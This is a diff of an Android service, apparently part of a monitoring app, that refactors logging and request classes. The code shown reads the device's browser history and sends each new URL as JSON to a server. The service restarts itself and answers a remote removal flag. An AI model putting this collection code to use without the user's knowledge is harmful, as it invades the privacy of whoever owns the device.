@@ -16,11 +16,10 @@ import android.database.Cursor;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.provider.Browser;
-import android.util.Log;
 
-import com.inet.android.bs.FileLog;
-import com.inet.android.bs.RequestMakerImpl;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
 /** Класс сбора истории стандартного браузера
  * 
@@ -35,13 +34,12 @@ public class LinkService extends Service {
 	final String SAVED_TIME = "saved_time";
 	private Context context;
 	private SharedPreferences sp;
-	RequestMakerImpl req;
+
 	public void onCreate() {
 		super.onCreate();
 		startService(new Intent(this, LinkService.class));
-		
-		Log.d(LOG_TAG, "onCreate histroyService");
-		FileLog.writeLog("onCreate histroyService");
+
+		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
 		
 		context = getApplicationContext();
 		sp = PreferenceManager.getDefaultSharedPreferences(context);
@@ -49,15 +47,15 @@ public class LinkService extends Service {
 	}
 
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		Log.d(LOG_TAG, "onStartCommand - " + sp.getString("ID", "ID"));
-		FileLog.writeLog(LOG_TAG + " -> onStartCommand - " + sp.getString("ID", "ID"));
+		
+		Logging.doLog(LOG_TAG, "onStartCommand - " + sp.getString("ID", "ID"), 
+				"onStartCommand - " + sp.getString("ID", "ID"));
 		
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
 		String linkEnd = sp.getString("ACTION", "OK");
 
 		if (linkEnd.equals("REMOVE")) {
-			Log.d(LOG_TAG, "REMOVE");
-			FileLog.writeLog("historyService -> REMOVE");
+			Logging.doLog(LOG_TAG, "REMOVE", "REMOVE");
 			
 			return 0;
 		}
@@ -75,13 +73,13 @@ public class LinkService extends Service {
 				
 		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
 		if (!isWork) {
-			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("historyService -> isWork return " + Boolean.toString(isWork));
+			Logging.doLog(LOG_TAG, "isDoWork return " + Boolean.toString(isWork), 
+					"isDoWork return " + Boolean.toString(isWork));
 			
 			return Service.START_STICKY;
 		} else {
-			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("historyService -> isDoWork return " + Boolean.toString(isWork));
+			Logging.doLog(LOG_TAG, "isDoWork return " + Boolean.toString(isWork), 
+					"isDoWork return " + Boolean.toString(isWork));
 		}
 		
 		linkTask(); // просомотр истории браузера
@@ -93,14 +91,10 @@ public class LinkService extends Service {
 	public void onDestroy() {
 		super.onDestroy();
 		
-		Log.d(LOG_TAG, "onDestroy");
-		FileLog.writeLog("historyService -> onDestroy");
+		Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
 	}
 
-	public IBinder onBind(Intent intent) {
-		Log.d(LOG_TAG, "onBind");
-		FileLog.writeLog("historyService -> onBind");
-		
+	public IBinder onBind(Intent intent) {	
 		return null;
 	}
 
@@ -137,10 +131,8 @@ public class LinkService extends Service {
 
 				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {
 
-					Log.d(LOG_TAG, "--- "
-							+ formatter.format(calendar.getTime()).toString());
-					FileLog.writeLog("historyService -> "
-							+ formatter.format(calendar.getTime()).toString());
+					Logging.doLog(LOG_TAG, "--- " + formatter.format(calendar.getTime()).toString(), 
+							"--- " + formatter.format(calendar.getTime()).toString());
 
 					calendar = Calendar.getInstance();
 					calendar.setTimeInMillis(Long.parseLong(urlDate));
@@ -163,17 +155,18 @@ public class LinkService extends Service {
 							+ "\"type\":\"4\","
 							+ "\"url\":\"" + url + "\","
 							+ "\"duration\":\"" + 30 + "\"}";
-					req = new RequestMakerImpl(context);
-					req.sendDataRequest(sendJSONStr);
+//					RequestMakerImpl req = new RequestMakerImpl(context);
+//					req.sendDataRequest(sendJSONStr);
+					
+					DataRequest dr = new DataRequest(context);
+					dr.sendRequest(sendJSONStr);
 
 					Editor ed = sPref.edit();
 					ed.putString(SAVED_TIME, urlDate);
 					ed.commit();
 					
-					Log.d(LOG_TAG, formatter.format(calendar.getTime())
-							.toString() + " - " + url);
-					FileLog.writeLog("historyService ->  "
-							+ formatter.format(calendar.getTime()).toString() + " - " + url);
+					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime()).toString() + " - " + url, 
+							formatter.format(calendar.getTime()).toString() + " - " + url);
 				}
 				mCur.moveToNext();
 			}
